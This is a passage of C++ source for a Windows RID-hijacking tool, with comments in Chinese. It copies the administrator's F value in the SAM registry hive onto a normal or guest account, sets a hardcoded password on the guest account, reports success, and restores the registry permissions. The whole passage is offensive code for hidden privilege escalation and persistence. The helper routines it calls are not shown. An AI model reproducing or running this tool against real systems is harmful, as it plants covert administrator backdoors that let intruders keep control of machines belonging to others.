				if (!GetUtype(UserName, Uktypeofadmin, SrcTYPE_admin)) {
					printf("[-] Get %s type error!\n", UserName);
				}
				else {
					// 获取普通用户的 IPTYPE
					char* normalUser = argv[2];
					char UktypeofUser[10] = { 0 };
					DWORD SrcTYPE_User = 0;
					char* Pass = const_cast<char*>("Yanghao@13579x");
					if (lstrcmpiA(normalUser, "guest") == 0) {
						if (4 == argc) {
							Pass = argv[3];
						}
						printf("[*] Set guest password: %s\n", Pass);
					}
					if (!GetUtype(const_cast <char*>(normalUser), UktypeofUser, SrcTYPE_User)) {
						printf("[-] GetUtype User %s,error!\n", normalUser);
					}
					else {
						// 复制 HKLM\SAM\SAM\Domains\Account\Users\ 中管理员F值和普通用户的其他值保存在缓冲区，然后删除普通用户，最后恢复注册表。


						if (GetFval(Uktypeofadmin, UktypeofUser, const_cast <char*>(normalUser), const_cast <char*>(Pass), SrcTYPE_User)) {
							printf("[+] The User %s RID Hijack %s successfully.\n", normalUser, UserName);

							// 恢复注册表权限
							RecoveryRegSAMPriv();
						}
						else {
							printf("[-] RID Hijack failed.\n");
						}
					}
				}
			}
			else {
				printf("[-] Enable SAM Priv failed.\n");
			}
		}
		else {
			printf("[-] Failure: Current permissions inadequate.\n");
		}
	}
	end = clock();
	printf("\n[*] Done. Time used: %lf seconds.\n", (double)((double)end - (double)start) / CLOCKS_PER_SEC);
	return TRUE;
}